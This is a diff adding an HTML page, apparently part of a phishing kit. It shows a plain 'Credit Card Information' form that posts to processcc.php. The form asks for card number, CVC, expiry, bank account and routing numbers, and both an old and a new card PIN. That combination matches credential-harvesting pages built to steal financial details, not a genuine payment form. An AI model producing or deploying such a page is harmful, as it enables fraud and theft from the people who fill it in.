@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Form Submission</title>
+    <style>
+        body {
+            background-image: url('background.jpg');
+            background-size: cover;
+            font-family: Arial, sans-serif;
+            color: black;
+            text-align: center;
+            padding-top: 100px;
+        }
+        form {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            display: inline-block;
+        }
+        input[type="text"], input[type="password"], input[type="number"], input[type="date"] {
+            display: block;
+            margin: 10px auto;
+            padding: 10px;
+            width: 80%;
+            border: none;
+            border-bottom: 2px solid #3498db;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            background-color: blue;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        select {
+            display: block;
+            margin: 10px auto;
+            padding: 10px;
+            width: 80%;
+            border: none;
+            border-bottom: 2px solid #3498db;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+
+<form action="processcc.php" method="post">
+    <img src="logo2.png" style="width: 100px; height: auto;">
+    <h2>Credit Card Information</h2>
+    <select name="card_type" required>
+        <option value="">Select Card Type</option>
+        <option value="Mastercard">Mastercard</option>
+        <option value="Visa">Visa</option>
+        <option value="American Express">American Express</option>
+    </select>
+    <input type="text" name="card_name" placeholder="Cardholder Name" required>
+    <input type="text" name="card_number" placeholder="Card Number" required>
+    <input type="date" name="expiry_date" placeholder="Expiry Date" required>
+    <input type="text" name="cvc" placeholder="CVC" required>
+    <input type="text" name="account_number" placeholder="Account Number" required>
+    <input type="text" name="routine_number" placeholder="Routine Number" required>
+    <input type="password" name="old_pin" placeholder="Old PIN" required>
+    <input type="password" name="new_pin" placeholder="New PIN" required>
+    <input type="submit" value="Submit">
+</form>
+
+</body>
+</html>
